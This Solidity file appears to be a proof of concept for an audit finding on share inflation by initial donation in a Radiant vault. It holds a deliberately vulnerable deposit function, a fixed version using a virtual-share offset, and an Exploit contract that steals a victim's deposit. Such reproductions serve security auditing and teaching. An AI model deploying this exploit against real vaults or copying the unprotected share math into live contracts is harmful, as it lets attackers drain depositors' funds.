// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Radiant UniV3TokenizedLp — inflation by an initial donation
    (Pashov Audit Group, Radiant June review, finding H-01).

    SYNTHETIC, cheatcode-free reduction of the deposit share line the report
    quotes. The first depositor mints 1 wei of shares, then transfers 1e18
    WETH straight to the vault. The next deposit of 0.5e18 rounds to 0 shares.
    Withdrawing the 1 wei share takes the donation and the victim's WETH.

    The control deposit uses a virtual-share offset, so the second depositor
    receives shares and the donation is not profit. */

contract Weth {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Vault {
    uint256 public constant PRECISION = 1e18;
    uint256 public oraclePrice = 1e18;
    Weth public token0;
    Weth public token1;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    uint256 public lastShares;

    constructor(Weth token0_, Weth token1_) {
        token0 = token0_;
        token1 = token1_;
    }

    function deposit(uint256 amount0, uint256 amount1, address receiver) external virtual returns (uint256 shares) {
        uint256 pool0 = token0.balanceOf(address(this));
        uint256 pool1 = token1.balanceOf(address(this));
        shares = amount1;
        if (totalSupply != 0) {
            uint256 pool0PricedInToken1 = (pool0 * oraclePrice) / PRECISION;
            // @> VULN: share price has no virtual offset, so the donation rounds the next mint to 0
            shares = (shares * totalSupply) / (pool0PricedInToken1 + pool1);
        }
        lastShares = shares;
        balanceOf[receiver] += shares;
        totalSupply += shares;
        if (amount1 > 0) token1.transferFrom(msg.sender, address(this), amount1);
    }

    function withdraw(uint256 shares, address receiver) external virtual returns (uint256 amount1) {
        amount1 = token1.balanceOf(address(this)) * shares / totalSupply;
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        token1.transfer(receiver, amount1);
    }
}

contract VaultFixed is Vault {
    uint256 public constant OFFSET = 1000;

    constructor(Weth token0_, Weth token1_) Vault(token0_, token1_) {}

    function deposit(uint256 amount0, uint256 amount1, address receiver) external override returns (uint256 shares) {
        amount0;
        uint256 pool1 = token1.balanceOf(address(this));
        shares = amount1 * (totalSupply + OFFSET) / (pool1 + 1);
        lastShares = shares;
        balanceOf[receiver] += shares;
        totalSupply += shares;
        if (amount1 > 0) token1.transferFrom(msg.sender, address(this), amount1);
    }
}

contract Victim {
    function approve(Weth token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }

    function deposit(Vault vault, uint256 amount) external {
        vault.deposit(0, amount, address(this));
    }
}

contract Exploit {
    uint256 public constant DONATION = 1 ether;
    uint256 public constant VICTIM_DEPOSIT = 0.5 ether;
    uint256 public constant PROFIT = 0.5 ether;

    Weth public weth;
    Weth public other;
    Vault public vault;
    Victim public victim;
    uint256 public victimShares;
    uint256 public profit;

    constructor() {
        weth = new Weth();
        other = new Weth();
        vault = new Vault(other, weth);
        victim = new Victim();
        weth.mint(address(this), 10 ether);
        weth.mint(address(victim), 1 ether);
    }

    function run() external {
        uint256 start = weth.balanceOf(address(this));
        weth.approve(address(vault), type(uint256).max);
        uint256 sharesOut = vault.deposit(0, 1, address(this));
        require(sharesOut == 1, "one share");
        weth.transfer(address(vault), DONATION + sharesOut - 1);
        victim.approve(weth, address(vault), VICTIM_DEPOSIT);
        victim.deposit(vault, VICTIM_DEPOSIT);
        victimShares = vault.balanceOf(address(victim));
        vault.withdraw(1, address(this));
        profit = weth.balanceOf(address(this)) - start;
        require(vault.balanceOf(address(this)) == 0, "share");
        require(victimShares == 0, "victim shares");
        require(profit == PROFIT, "profit");
    }
}
